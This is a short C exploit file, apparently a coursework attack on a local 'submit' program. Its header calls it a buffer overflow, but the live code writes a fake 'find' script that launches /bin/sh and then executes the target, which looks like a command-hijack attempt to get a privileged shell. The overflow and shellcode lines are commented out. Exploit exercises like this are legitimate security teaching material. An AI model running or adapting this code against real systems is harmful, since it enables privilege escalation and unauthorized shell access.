/*
 * sploit1.c
 * buffer overflow version, attack the check_for_viruses function
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include "shellcode.h"

#define TARGET "/usr/local/bin/submit" // or submitV2

int main() {
    FILE *fp;
	char *args[4];
	char *env[1];
    unsigned char argbuf[4017]; 

    char *ptr;

    strcpy(argbuf, "/bin/sh");

    // create the argbuf
    //memset(argbuf, '.', sizeof(unsigned char)*4016);

    //ptr = argbuf;
    //memcpy(ptr, shellcode, strlen(shellcode));

   // fp = fopen("/usr/bin/find", "w+");
    //fprintf(fp, "%s", argbuf);
    fp = fopen("find", "w+");
	fprintf(fp, "/bin/sh");
	fclose(fp);


	args[0] = TARGET;
	args[1] = "-s"; 
    args[2] = NULL;
    args[3] = NULL;

	env[0] = NULL;

	execve(TARGET, args, env);
    fprintf(stderr, "execve failed\n");
    

	
	return 1;
}
